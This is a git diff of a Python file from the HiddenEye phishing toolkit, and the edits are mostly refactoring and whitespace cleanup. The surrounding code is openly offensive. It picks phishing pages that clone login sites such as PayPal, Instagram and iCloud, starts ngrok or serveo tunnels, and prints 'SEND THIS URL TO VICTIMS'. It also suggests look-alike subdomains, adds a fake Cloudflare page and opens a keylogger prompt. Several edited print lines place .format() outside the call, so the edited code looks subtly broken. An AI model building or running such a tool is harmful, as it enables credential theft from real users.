@@ -8,7 +8,7 @@ import json
 from urllib.request import urlopen
 from subprocess import check_output, CalledProcessError
 from sys import stdout, argv, exit
-from Defs.ThemesManager import colorSelector
+from Defs.ThemesManager import ThemeManager
 from Defs.Configurations import readConfig, ifSettingsNotExists
 from Defs.Languages import *
 
@@ -25,7 +25,7 @@ for arg in argv:
 if config.get("Settings", "DidBackground") == "True":
     logFile = open("log.txt", "w")
 
-colorTheme = colorSelector()
+colorTheme = ThemeManager().colorSelector()
 MAIN0, MAIN1, MAIN2, MAIN3, MAIN4 = colorTheme[0], colorTheme[1], colorTheme[2], colorTheme[3],  colorTheme[4]
 
 def runPhishing(page , customOption): #Phishing pages selection menu
@@ -128,14 +128,14 @@ def runPhishing(page , customOption): #Phishing pages selection menu
 
 def selectPort(): #Question where user must select port
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}").format(MAIN0, MAIN4))
-        choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
+        print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}").format(MAIN0, MAIN4)
+        choice = input(" \n{0}HiddenEye >>> {1}".format(MAIN0, MAIN2))
         try:
             if (int(choice) > 65535 or int(choice) < 1):
                 return selectPort()
@@ -146,26 +146,26 @@ def selectPort(): #Question where user must select port
 
 def selectServer(port): #Question where user must select server
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-        print(_("\n {1}[{0}!{1}]{1}(SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
-        print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo").format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
+        print("\n {1}[{0}!{1}]{1}(SERVEO WORKS BETTER)").format(MAIN0, MAIN2)
+        print("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4)
+        print("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo").format(MAIN0, MAIN2)
 
-        choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+        choice = input(" \n{0}HiddenEye >>> {1}".format(MAIN0, MAIN2))
         if choice == '1':
 
-            print(_('''
+            print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
-            
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ NGROK SERVER PROCEDURE ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
+
             system('./Server/ngrok http {} > /dev/null &'.format(port))
             while True:
                 sleep(2)
@@ -174,8 +174,8 @@ def selectServer(port): #Question where user must select server
                 url = urlFile.read()
                 urlFile.close()
                 if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-                    print(_("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3))
-                    print("\n")  
+                    print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}").format(MAIN0, MAIN4, MAIN3)
+                    print("\n")
                     break
 
         elif choice == '2':
@@ -187,15 +187,15 @@ def selectServer(port): #Question where user must select server
             return selectServer(port)
 
 def runServeo(port):
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. ''').format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2))
-    print(_("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2))
-    choice = input("\n\n{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. ''').format(MAIN0, MAIN2)
+    print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}").format(MAIN0, MAIN2)
+    print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)").format(MAIN0, MAIN2)
+    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(MAIN0, MAIN2))
     system('clear')
     if choice == '1':
 
@@ -208,13 +208,13 @@ def runServeo(port):
 
 def customServeo(port):
 
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo''').format(MAIN0, MAIN2))
-    lnk = input(_("\n{0}CUSTOM Subdomain>>> {2}").format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for serveo''').format(MAIN0, MAIN2)
+    lnk = input("\n{0}CUSTOM Subdomain>>> {2}").format(MAIN0, MAIN4, MAIN2)
     if not ".serveo.net" in lnk:
         lnk += ".serveo.net"
     else:
@@ -223,14 +223,14 @@ def customServeo(port):
     sleep(7)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
+        url = str(output).strip("b ' \ n r") #FIXME
         system('clear')
-        print(_('''
+        print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
         print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
         print("\n")
 
@@ -301,7 +301,7 @@ def mainMenu():
     print (_(" {0}[{1}4{0}]{1} GitHub          {0}[{1}13{0}]{1} Steam          {0}[{1}22{0}]{1} Quora          {0}[{1}31{0}]{1} PayPal").format(MAIN0, MAIN2))
     print (_(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}14{0}]{1} VK             {0}[{1}23{0}]{1} PornHub        {0}[{1}32{0}]{1} Shopify").format(MAIN0, MAIN2))
     print (_(" {0}[{1}6{0}]{1} WordPress       {0}[{1}15{0}]{1} iCloud         {0}[{1}24{0}]{1} Adobe          {0}[{1}33{0}]{1} Verizon").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))                 
+    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))
 
     print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit").format(MAIN0, MAIN2))
     print (_(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      ").format(MAIN0, MAIN2))
@@ -502,20 +502,20 @@ def cloudfarePrompt():
         {0}** BY: {1}DARKSEC {0}**
 ''').format(MAIN0, MAIN2))
 	print(_("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
-	
+
 def addingCloudfare():
         print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4))
         choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
         if choice == 'y' or choice == 'Y':
            addCloudfare()
         else:
-            sleep(1)           
-           
+            sleep(1)
+
 def addCloudfare():
          system('cp Server/www/index.html Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
          print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
          sleep(2)
-		
+
 def keyloggerprompt():
 	system('clear')
 	print (_('''{1}
